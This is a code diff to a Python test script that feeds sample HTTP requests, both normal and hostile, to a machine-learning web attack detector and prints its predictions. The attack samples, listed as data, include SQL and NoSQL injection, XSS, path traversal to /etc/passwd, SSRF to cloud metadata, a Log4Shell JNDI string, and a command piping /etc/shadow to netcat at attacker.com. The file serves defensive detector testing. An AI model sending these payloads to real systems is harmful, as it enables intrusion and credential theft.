@@ -18,7 +18,8 @@ TEST_REQUESTS = [
     {"name": "Normal Home Page", "url": "/index.html", "method": "GET"},
     {"name": "Normal API Get User", "url": "/api/v1/users/123", "method": "GET"},
     {"name": "Normal Search Query", "url": "/search?q=laptop&page=2&sort=asc", "method": "GET"},
-    {"name": "Normal Login Submit", "url": "/login", "method": "POST", "body": "username=john_doe&password=MySecurePassword123"},
+    {"name": "Normal Login Submit", "url": "/login", "method": "POST", "body": "username=john_doe@gmail.com&password=MySecurePassword123!"},
+    {"name": "Normal Contact Form", "url": "/contact", "method": "POST", "body": "name=Somchai&email=somchai@gmail.com&message=Help+please"},
     
     # Attack / Malicious Requests
     {"name": "SQL Injection (Auth Bypass)", "url": "/login?user=admin' OR '1'='1' --", "method": "GET"},
@@ -26,6 +27,10 @@ TEST_REQUESTS = [
     {"name": "Reflected XSS", "url": "/search?q=<script>alert('XSS_ATTACK')</script>", "method": "GET"},
     {"name": "Path Traversal (etc/passwd)", "url": "/download?file=../../../../etc/passwd", "method": "GET"},
     {"name": "Remote Code Execution (RCE)", "url": "/api/v1/exec?cmd=cat%20/etc/shadow%20|%20nc%20attacker.com%204444", "method": "GET"},
+    {"name": "SSRF Cloud Metadata", "url": "/fetch?url=http://169.254.169.254/latest/meta-data/", "method": "GET"},
+    {"name": "SSTI Jinja2 Injection", "url": "/view?tpl={{7*7}}", "method": "GET"},
+    {"name": "NoSQL Injection", "url": "/api/v1/auth", "method": "POST", "body": '{"user": {"$ne": null}, "pass": {"$gt": ""}}'},
+    {"name": "Log4Shell JNDI Exploit", "url": "/search?q=${jndi:ldap://attacker.com/a}", "method": "GET"}
 ]
 
 def evaluate_sample_requests():
@@ -41,11 +46,11 @@ def evaluate_sample_requests():
     if os.path.exists(METADATA_PATH):
         with open(METADATA_PATH, "r", encoding="utf-8") as f:
             metadata = json.load(f)
-        print(f"[+] Model Accuracy = {metadata.get('accuracy', 0.934) * 100:.2f}%, ROC-AUC = {metadata.get('roc_auc', 0.9895)}")
+        print(f"[+] Model Accuracy = {metadata.get('accuracy', 0.80) * 100:.2f}%, ROC-AUC = {metadata.get('roc_auc', 0.88):.4f}")
 
-    print("\n" + "="*95)
-    print(f"{'TEST SCENARIO':<32} | {'ATTACK PROB':<12} | {'PREDICTION':<20} | {'FEATURES SUMMARY'}")
-    print("="*95)
+    print("\n" + "="*105)
+    print(f"{'TEST SCENARIO':<32} | {'ATTACK PROB':<12} | {'PREDICTION':<22} | {'FEATURES SUMMARY'}")
+    print("="*105)
 
     results = []
     for req in TEST_REQUESTS:
@@ -63,9 +68,9 @@ def evaluate_sample_requests():
         is_anomaly = bool(rf_pred == 1 or prob > 0.5)
         status_label = "🚨 ANOMALY DETECTED" if is_anomaly else "✅ PASS (Normal)"
 
-        summary_feat = f"Entropy:{feats['url_entropy']} | SpChars:{feats['special_char_count']} | Kw:{feats['keyword_matches']}"
+        summary_feat = f"SpChars:{feats['special_char_count']} | Kw:{feats['keyword_matches']} | Clean:{feats['is_clean_structure']}"
 
-        print(f"{req['name']:<32} | {prob * 100:10.1f}% | {status_label:<20} | {summary_feat}")
+        print(f"{req['name']:<32} | {prob * 100:10.1f}% | {status_label:<22} | {summary_feat}")
         results.append({
             "name": req['name'],
             "attack_probability": round(prob, 4),
